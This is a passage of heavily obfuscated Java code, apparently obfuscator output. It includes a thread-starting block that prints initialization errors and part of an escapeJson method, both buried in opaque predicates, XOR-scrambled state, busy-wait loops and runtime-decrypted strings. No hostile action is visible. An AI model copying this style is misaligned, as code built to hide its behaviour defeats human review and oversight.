                                                                                                                     case 423282809 -> var209 = yvmsnlgcbwwkcori(var209, 785304210);
                                                                                                                     case 516554488 -> var209 = 238070850 ^ var209;
                                                                                                                     case 614021369 -> var209 = 695907458 ^ var209;
                                                                                                                     case 617573936 -> var209 = yvmsnlgcbwwkcori(var209, 158367323);
                                                                                                                     case 638832025 -> var209 = yvmsnlgcbwwkcori(var209, 690743854);
                                                                                                                     case 645940328 -> var209 = 154770192 ^ var209;
                                                                                                                     case 695893105 -> var209 = 684121107 ^ var209;
                                                                                                                     case 721764985 -> var209 = 680082386 ^ var209;
                                                                                                                     case 803427531 -> var209 = yvmsnlgcbwwkcori(var209, 1746270468);
                                                                                                                     case 871275593 -> var209 = yvmsnlgcbwwkcori(var209, 731136020);
                                                                                                                     case 1039841266 -> var209 = 1247200611 ^ var209;
                                                                                                                     case 1219560362 -> var209 = yvmsnlgcbwwkcori(var209, 1157608424);
                                                                                                                     case 1508255251 -> var209 = yvmsnlgcbwwkcori(var209, 1725257567);
                                                                                                                     case 1524457786 -> var209 = 1186086842 ^ var209;
                                                                                                                     case 1634422336 -> var209 = 29686357 ^ var209;
                                                                                                                     case 1763646002 -> var209 = 1087008987 ^ var209;
                                                                                                                     case 1775107947 -> var209 = yvmsnlgcbwwkcori(var209, 1624255600);
                                                                                                                     case 1782305051 -> var209 = yvmsnlgcbwwkcori(var209, 1622075838);
                                                                                                                     case 1883164105 -> var209 = 602819108 ^ var209;
                                                                                                                     case 2038521929 -> var209 = 584695700 ^ var209;
                                                                                                                     default -> throw new IllegalAccessException("Error in hash");
                                                                                                                  }

                                                                                                                  Exception var86 = var10000;
                                                                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1867291880) {
                                                                                                                     do {
                                                                                                                        while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1867291880) {
                                                                                                                        }
                                                                                                                     } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1995427469 ^ var209));

                                                                                                                     int var235 = 1188171330 ^ var209;
                                                                                                                     throw new IOException("double");
                                                                                                                  }

                                                                                                                  var209 = 1712654568 ^ var209;
                                                                                                                  PrintStream var87 = System.out;
                                                                                                                  Class var131 = var86.getClass();
                                                                                                                  String var132 = var131.getSimpleName();
                                                                                                                  String var146 = var86.getMessage();
                                                                                                                  String var133 = "Initialization error: " + var132 + " - " + var146;
                                                                                                                  var87.println(var133);
                                                                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 1608833963) {
                                                                                                                     var209 = 299440525 ^ var209;
                                                                                                                     var86.printStackTrace();
                                                                                                                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -785639485) {
                                                                                                                        var209 = 1255027922 ^ var209;
                                                                                                                        return;
                                                                                                                     }
                                                                                                                     break label1024;
                                                                                                                  }
                                                                                                                  break label899;
                                                                                                               }
                                                                                                            }

                                                                                                            while(true) {
                                                                                                               while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 871275593) {
                                                                                                               }

                                                                                                               if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1443922130 ^ var209)) {
                                                                                                                  int var270 = 600573187 ^ var209;
                                                                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1678731693 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (434169258 ^ var209)) {
                                                                                                                     var270 = 873668455 ^ var209;
                                                                                                                     throw new IOException("double");
                                                                                                                  }
                                                                                                               }
                                                                                                            }
                                                                                                         }

                                                                                                         while(true) {
                                                                                                            while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -360230256) {
                                                                                                            }

                                                                                                            if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1467711531 ^ var209)) {
                                                                                                               int var292 = 53493760 ^ var209;
                                                                                                               if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 803427531 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (965609390 ^ var209)) {
                                                                                                                  var292 = 38879698 ^ var209;
                                                                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -351630191 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (75827995 ^ var209)) {
                                                                                                                     var292 = 483516640 ^ var209;
                                                                                                                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -68334111 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1484641054 ^ var209)) {
                                                                                                                        var292 = 1881246489 ^ var209;
                                                                                                                        throw new RuntimeException("double");
                                                                                                                     }
                                                                                                                  }
                                                                                                               }
                                                                                                            }
                                                                                                         }
                                                                                                      }

                                                                                                      while(true) {
                                                                                                         while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -134186344) {
                                                                                                         }

                                                                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1552445664 ^ var209)) {
                                                                                                            int var290 = 587215284 ^ var209;
                                                                                                            if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -249825464 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1389642830 ^ var209)) {
                                                                                                               var290 = 1375674843 ^ var209;
                                                                                                               throw new IllegalAccessException("double");
                                                                                                            }
                                                                                                         }
                                                                                                      }
                                                                                                   }

                                                                                                   while(true) {
                                                                                                      while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 2122281115) {
                                                                                                      }

                                                                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1347707632 ^ var209)) {
                                                                                                         int var285 = 1039368629 ^ var209;
                                                                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -494408720 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1675950915 ^ var209)) {
                                                                                                            var285 = 237753960 ^ var209;
                                                                                                            if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 423282809 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1997776989 ^ var209)) {
                                                                                                               var285 = 1749578727 ^ var209;
                                                                                                               if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 73825104 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (764258236 ^ var209)) {
                                                                                                                  var285 = 1408662767 ^ var209;
                                                                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 617573936 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1501542126 ^ var209)) {
                                                                                                                     var285 = 16236313 ^ var209;
                                                                                                                     throw new IOException("double");
                                                                                                                  }
                                                                                                               }
                                                                                                            }
                                                                                                         }
                                                                                                      }
                                                                                                   }
                                                                                                }

                                                                                                while(true) {
                                                                                                   while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -358430725) {
                                                                                                   }

                                                                                                   if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1586001365 ^ var209)) {
                                                                                                      int var282 = 1079367338 ^ var209;
                                                                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1266663808 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1292695483 ^ var209)) {
                                                                                                         var282 = 778072973 ^ var209;
                                                                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 1608833963 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (507399495 ^ var209)) {
                                                                                                            var282 = 1560697900 ^ var209;
                                                                                                            throw new IOException("double");
                                                                                                         }
                                                                                                      }
                                                                                                   }
                                                                                                }
                                                                                             }

                                                                                             do {
                                                                                                while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 695893105) {
                                                                                                }
                                                                                             } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1020379461 ^ var209));

                                                                                             int var275 = 1744283537 ^ var209;
                                                                                             throw new RuntimeException("double");
                                                                                          }

                                                                                          while(true) {
                                                                                             while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 591400579) {
                                                                                             }

                                                                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (534085271 ^ var209)) {
                                                                                                int var276 = 118250561 ^ var209;
                                                                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -942770557 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (171736353 ^ var209)) {
                                                                                                   var276 = 1061664090 ^ var209;
                                                                                                   if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -837573895 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (5577296 ^ var209)) {
                                                                                                      var276 = 1116839023 ^ var209;
                                                                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 1524457786 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1229959782 ^ var209)) {
                                                                                                         var276 = 1456182723 ^ var209;
                                                                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1142900215 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1836012114 ^ var209)) {
                                                                                                            var276 = 367511479 ^ var209;
                                                                                                            if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 201488753 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1172785111 ^ var209)) {
                                                                                                               var276 = 40310842 ^ var209;
                                                                                                               throw new IOException();
                                                                                                            }
                                                                                                         }
                                                                                                      }
                                                                                                   }
                                                                                                }
                                                                                             }
                                                                                          }
                                                                                       }

                                                                                       while(true) {
                                                                                          while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1463369238) {
                                                                                          }

                                                                                          if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (615403317 ^ var209)) {
                                                                                             int var273 = 762478033 ^ var209;
                                                                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 1652349898 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1902212015 ^ var209)) {
                                                                                                var273 = 1600467147 ^ var209;
                                                                                                throw new IOException("double");
                                                                                             }
                                                                                          }
                                                                                       }
                                                                                    }

                                                                                    do {
                                                                                       while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1775107947) {
                                                                                       }
                                                                                    } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (928778267 ^ var209));

                                                                                    int var272 = 1893896693 ^ var209;
                                                                                    throw new IOException("double");
                                                                                 }

                                                                                 while(true) {
                                                                                    while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 416232737) {
                                                                                    }

                                                                                    if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1924655059 ^ var209)) {
                                                                                       int var268 = 1444905289 ^ var209;
                                                                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 721764985 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (188877807 ^ var209)) {
                                                                                          var268 = 2027238531 ^ var209;
                                                                                          throw new IOException("double");
                                                                                       }
                                                                                    }
                                                                                 }
                                                                              }

                                                                              while(true) {
                                                                                 while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -2113501718) {
                                                                                 }

                                                                                 if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1520061207 ^ var209)) {
                                                                                    int var264 = 1448087794 ^ var209;
                                                                                    if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1659852455 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1062786592 ^ var209)) {
                                                                                       var264 = 745079768 ^ var209;
                                                                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1632813069 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1503397727 ^ var209)) {
                                                                                          var264 = 194870851 ^ var209;
                                                                                          if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 1763646002 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1210905575 ^ var209)) {
                                                                                             var264 = 1720804959 ^ var209;
                                                                                             throw new RuntimeException("double");
                                                                                          }
                                                                                       }
                                                                                    }
                                                                                 }
                                                                              }
                                                                           }

                                                                           while(true) {
                                                                              while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1782305051) {
                                                                              }

                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (761832457 ^ var209)) {
                                                                                 int var262 = 976895445 ^ var209;
                                                                                 if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -2046000653 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1434642193 ^ var209)) {
                                                                                    var262 = 1641747658 ^ var209;
                                                                                    throw new IOException("double");
                                                                                 }
                                                                              }
                                                                           }
                                                                        }

                                                                        while(true) {
                                                                           while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -537140223) {
                                                                           }

                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1740309219 ^ var209)) {
                                                                              int var260 = 586992724 ^ var209;
                                                                              if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 82650536 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (233392630 ^ var209)) {
                                                                                 var260 = 2127112336 ^ var209;
                                                                                 throw new RuntimeException("double");
                                                                              }
                                                                           }
                                                                        }
                                                                     }

                                                                     while(true) {
                                                                        while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1883164105) {
                                                                        }

                                                                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1383970593 ^ var209)) {
                                                                           int var258 = 2022390326 ^ var209;
                                                                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1883515000 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (268921627 ^ var209)) {
                                                                              var258 = 1433360454 ^ var209;
                                                                              throw new IOException("double");
                                                                           }
                                                                        }
                                                                     }
                                                                  }

                                                                  do {
                                                                     while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -68707638) {
                                                                     }
                                                                  } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1209783064 ^ var209));

                                                                  int var252 = 1213318466 ^ var209;
                                                                  throw new IllegalAccessException("double");
                                                               }

                                                               while(true) {
                                                                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -466632296) {
                                                                  }

                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (342504726 ^ var209)) {
                                                                     int var250 = 1289110163 ^ var209;
                                                                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 560246698 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1008430636 ^ var209)) {
                                                                        var250 = 1358587945 ^ var209;
                                                                        throw new RuntimeException("double");
                                                                     }
                                                                  }
                                                               }
                                                            }

                                                            while(true) {
                                                               while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -150124232) {
                                                               }

                                                               if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1016337343 ^ var209)) {
                                                                  int var248 = 1356220227 ^ var209;
                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -545174823 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (86763068 ^ var209)) {
                                                                     var248 = 232189602 ^ var209;
                                                                     throw new IllegalAccessException("double");
                                                                  }
                                                               }
                                                            }
                                                         }

                                                         do {
                                                            while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1634422336) {
                                                            }
                                                         } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1359060132 ^ var209));

                                                         int var247 = 632630442 ^ var209;
                                                         throw new IOException("double");
                                                      }

                                                      do {
                                                         while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1294366373) {
                                                         }
                                                      } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (787156360 ^ var209));

                                                      int var246 = 1835273258 ^ var209;
                                                      throw new IOException("double");
                                                   }

                                                   do {
                                                      while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1039841266) {
                                                      }
                                                   } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (616469109 ^ var209));

                                                   int var245 = 820194705 ^ var209;
                                                   throw new RuntimeException("double");
                                                }

                                                do {
                                                   while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1461450485) {
                                                   }
                                                } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (423662183 ^ var209));

                                                int var244 = 1724022538 ^ var209;
                                                throw new IllegalAccessException("double");
                                             }

                                             while(true) {
                                                while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 2038521929) {
                                                }

                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (575922932 ^ var209)) {
                                                   int var253 = 2041349361 ^ var209;
                                                   if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 645940328 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (976608793 ^ var209)) {
                                                      var253 = 928135092 ^ var209;
                                                      throw new RuntimeException("double");
                                                   }
                                                }
                                             }
                                          }

                                          while(true) {
                                             while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1200281387) {
                                             }

                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1238739904 ^ var209)) {
                                                int var255 = 1962760745 ^ var209;
                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1558944591 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1277387471 ^ var209)) {
                                                   var255 = 1890406051 ^ var209;
                                                   if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -924584037 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (682985914 ^ var209)) {
                                                      var255 = 316888180 ^ var209;
                                                      throw new IOException("double");
                                                   }
                                                }
                                             }
                                          }
                                       }

                                       do {
                                          while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -2021874949) {
                                          }
                                       } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1092281182 ^ var209));

                                       int var242 = 1812663124 ^ var209;
                                       throw new IllegalAccessException("double");
                                    }

                                    while(true) {
                                       while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1629118712) {
                                       }

                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (550112840 ^ var209)) {
                                          int var240 = 1300334345 ^ var209;
                                          if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1030005975 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (963919709 ^ var209)) {
                                             var240 = 365509187 ^ var209;
                                             throw new IllegalAccessException("double");
                                          }
                                       }
                                    }
                                 }

                                 while(true) {
                                    while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1219560362) {
                                    }

                                    if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1524577710 ^ var209)) {
                                       int var238 = 2093287975 ^ var209;
                                       if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == 638832025 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1120828618 ^ var209)) {
                                          var238 = 1350510465 ^ var209;
                                          throw new IllegalAccessException("double");
                                       }
                                    }
                                 }
                              }

                              do {
                                 while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 516554488) {
                                 }
                              } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (879861889 ^ var209));

                              int var237 = 707106025 ^ var209;
                              throw new RuntimeException("double");
                           }

                           do {
                              while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 614021369) {
                              }
                           } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1707021793 ^ var209));

                           int var236 = 1292843943 ^ var209;
                           throw new IllegalAccessException("double");
                        }

                        do {
                           while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 69388896) {
                           }
                        } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (1674162452 ^ var209));

                        int var243 = 2005126536 ^ var209;
                        throw new IOException("double");
                     }

                     while(true) {
                        while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1299337023) {
                        }

                        if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (814538318 ^ var209)) {
                           int var231 = 732205212 ^ var209;
                           if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -1500310392 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1541891667 ^ var209)) {
                              var231 = 1257904408 ^ var209;
                              throw new IllegalAccessException("double");
                           }
                        }
                     }
                  }

                  do {
                     while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != 1508255251) {
                     }
                  } while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != (459613986 ^ var209));

                  int var230 = 991418112 ^ var209;
                  throw new IllegalAccessException("double");
               }

               while(true) {
                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var209) != -1207562128) {
                  }

                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (1777284945 ^ var209)) {
                     int var233 = 1163300156 ^ var209;
                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var209) == -785639485 && iweepkikjyqovrst.kyzurcumkqclfujx(var209) == (120371996 ^ var209)) {
                        var233 = 1366459406 ^ var209;
                        throw new IOException("double");
                     }
                  }
               }
            };
            Thread var4 = new Thread(var5);
            if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 974283985) {
               var8 ^= 627373019;
               var4.start();
               if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 288750088) {
                  var8 = 132114314 ^ var8;
                  return;
               }
            }

            while(true) {
               while(iweepkikjyqovrst.kyzurcumkqclfujx(var8) != 974283985) {
               }

               if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == (616126351 ^ var8)) {
                  int var12 = 1381110875 ^ var8;
                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 801818200 && iweepkikjyqovrst.kyzurcumkqclfujx(var8) == (478642610 ^ var8)) {
                     var12 = 347487480 ^ var8;
                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 288750088 && iweepkikjyqovrst.kyzurcumkqclfujx(var8) == (1038239938 ^ var8)) {
                        var12 = 963677900 ^ var8;
                        throw new IllegalAccessException();
                     }
                  }
               }
            }
         }
      }

      while(true) {
         while(iweepkikjyqovrst.kyzurcumkqclfujx(var8) != 158360921) {
         }

         if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == (200007655 ^ var8)) {
            int var10000 = 398552757 ^ var8;
            if (iweepkikjyqovrst.kyzurcumkqclfujx(var8) == 1196684538 && iweepkikjyqovrst.kyzurcumkqclfujx(var8) == (1819664157 ^ var8)) {
               var10000 = 644208894 ^ var8;
               throw new RuntimeException("double");
            }
         }
      }
   }

   private String escapeJson(String s, int var2) {
      StringBuilder var7;
      label697: {
         int var64;
         label779: {
            label694: {
               label780: {
                  label781: {
                     label689: {
                        label771: {
                           label687: {
                              label686: {
                                 label685: {
                                    label772: {
                                       label714: {
                                          var64 = 822350206 ^ 1334673415 ^ 1150275907;
                                          if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -802029103) {
                                             var64 = 1391288401 ^ var64;
                                             if (s == null) {
                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 1197015899) {
                                                   var64 = 36141553 ^ var64;
                                                   String var12 = glquaglpxj(cefbcmdqcrbsnmp(), var64);
                                                   return var12;
                                                }
                                                break label686;
                                             }

                                             var64 = 1395647521 ^ var64;
                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -567926191) {
                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -567926191) {
                                                   break label780;
                                                }

                                                var64 = yvmsnlgcbwwkcori(var64, 1589644194);
                                                break label686;
                                             }

                                             var64 = yvmsnlgcbwwkcori(var64, 1146127497);
                                             StringBuilder var13 = new StringBuilder();
                                             var7 = var13;
                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -56490469) {
                                                do {
                                                   while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -56490469) {
                                                   }
                                                } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (290802328 ^ var64));

                                                int var105 = 752660562 ^ var64;
                                                throw new IOException("double");
                                             }

                                             var64 = 594276072 ^ var64;
                                             char[] var15 = s.toCharArray();
                                             char[] var8 = var15;
                                             int var17 = var15.length;
                                             int var9 = var17;
                                             byte var18 = (byte)(1560260139 ^ var64);
                                             int var10 = var18;
                                             if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -402820774) {
                                                break label714;
                                             }

                                             var64 = 207406036 ^ var64;

                                             label681:
                                             while(true) {
                                                if (var10 >= var9) {
                                                   var64 = yvmsnlgcbwwkcori(var64, 2139133481);
                                                   if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 2032131761) {
                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == 2032131761) {
                                                         var64 = yvmsnlgcbwwkcori(var64, 1244083262);
                                                         break label686;
                                                      }
                                                      break label685;
                                                   }

                                                   while(true) {
                                                      switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                         case 190159053:
                                                            var64 = 470216783 ^ var64;
                                                            break label697;
                                                         case 304233594:
                                                            break;
                                                         case 793268803:
                                                            break label697;
                                                         case 1772826829:
                                                         default:
                                                            break label772;
                                                      }
                                                   }
                                                }

                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -2061799430) {
                                                   while(true) {
                                                      while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 1689148745) {
                                                      }

                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (1437157966 ^ var64)) {
                                                         int var98 = 2055693985 ^ var64;
                                                         if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -2061799430 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (469870007 ^ var64)) {
                                                            var98 = 2030795529 ^ var64;
                                                            throw new IOException("double");
                                                         }
                                                      }
                                                   }
                                                }

                                                var64 = 1344570899 ^ var64;
                                                char var21 = var8[var10];
                                                if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 71262048) {
                                                   break label687;
                                                }

                                                var64 = 1172670754 ^ var64;
                                                int var56 = var21 ^ var64;
                                                label676:
                                                switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var56)) {
                                                   case 107928067:
                                                      label653:
                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 107928077:
                                                               var64 ^= 69062455;
                                                               break label653;
                                                            case 203001084:
                                                               break;
                                                            case 539237131:
                                                               break label653;
                                                            case 754937624:
                                                            default:
                                                               while(true) {
                                                                  while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 813740649) {
                                                                  }

                                                                  if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (79520198 ^ var64)) {
                                                                     int var86 = 2090899342 ^ var64;
                                                                     if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) == -633549542 && iweepkikjyqovrst.kyzurcumkqclfujx(var64) == (811581634 ^ var64)) {
                                                                        var86 = 2120851253 ^ var64;
                                                                        throw new IOException("double");
                                                                     }
                                                                  }
                                                               }
                                                         }
                                                      }

                                                      String var44 = glquaglpxj(rwzxbpqowwgeuqi(), var64);
                                                      StringBuilder var28 = var7.append(var44);
                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 201158602) {
                                                         break label681;
                                                      }

                                                      var64 = 1207969494 ^ var64;

                                                      try {
                                                         if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 40309972) {
                                                            throw null;
                                                         }

                                                         throw new IOException();
                                                      } catch (IOException var60) {
                                                         switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                            case -1416757415 -> var64 = 1470934131 ^ var64;
                                                            case 1274829176 -> var64 = 1805818039 ^ var64;
                                                            default -> throw new IllegalAccessException("Error in hash");
                                                         }
                                                      }

                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 384343235) {
                                                         break label694;
                                                      }

                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 181960175:
                                                            default:
                                                               break label779;
                                                            case 260847403:
                                                               var64 ^= 1343281809;
                                                            case 908745723:
                                                               break label676;
                                                            case 1829905760:
                                                         }
                                                      }
                                                   case 107928121:
                                                      var64 = 909399202 ^ var64;
                                                      String var42 = glquaglpxj(aeimrgxkxibdfrx(), var64);
                                                      StringBuilder var24 = var7.append(var42);
                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1699630237) {
                                                         break label781;
                                                      }

                                                      label611:
                                                      while(true) {
                                                         switch (iweepkikjyqovrst.nmnwjialmtrkdahy(var64)) {
                                                            case 199279414:
                                                               break label611;
                                                            case 259488295:
                                                               var64 ^= 672247759;
                                                               break label611;
                                                            case 273614741:
                                                            default:
                                                               break label686;
                                                            case 515646666:
                                                         }
                                                      }

                                                      try {
                                                         if (iweepkikjyqovrst.nmnwjialmtrkdahy(var64) != 14344940) {
                                                            throw null;
                                                         }

                                                         throw new IOException();
                                                      } catch (IOException var58) {
                                                         switch (iweepkikjyqovrst.gzblpjtxucfsuggz(var64)) {
                                                            case -633549542 -> var64 ^= 600066146;
                                                            case 813740649 -> var64 ^= 1586743180;
                                                            default -> throw new IOException("Error in hash");
                                                         }
                                                      }

                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != -1004630517) {
                                                         break label779;
                                                      }

                                                      var64 = yvmsnlgcbwwkcori(var64, 1246632136);
                                                      break;
                                                   case 107928123:
                                                      var64 = 51378923 ^ var64;
                                                      String var43 = glquaglpxj(zxolcndoghxvldv(), var64);
                                                      StringBuilder var26 = var7.append(var43);
                                                      if (iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 862765354) {
                                                         do {
                                                            while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != 862765354) {
                                                            }
                                                         } while(iweepkikjyqovrst.kyzurcumkqclfujx(var64) != (397982200 ^ var64));

                                                         int var77 = 1048618621 ^ var64;
                                                         throw new RuntimeException("double");
                                                      }

                                                      label588:
                                                      while(true) {
